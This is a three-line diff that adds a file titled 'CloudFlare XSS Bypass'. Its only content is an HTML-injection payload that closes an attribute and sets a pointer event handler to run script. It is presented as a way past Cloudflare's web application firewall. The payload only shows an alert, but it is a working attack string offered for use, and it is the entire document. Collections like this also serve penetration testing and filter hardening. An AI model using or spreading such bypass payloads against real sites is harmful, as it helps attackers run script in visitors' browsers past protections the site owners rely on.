@@ -1,0 +1,3 @@
+CloudFlare XSS Bypass :
+
+"><P/onpointerenter=alert(1)>
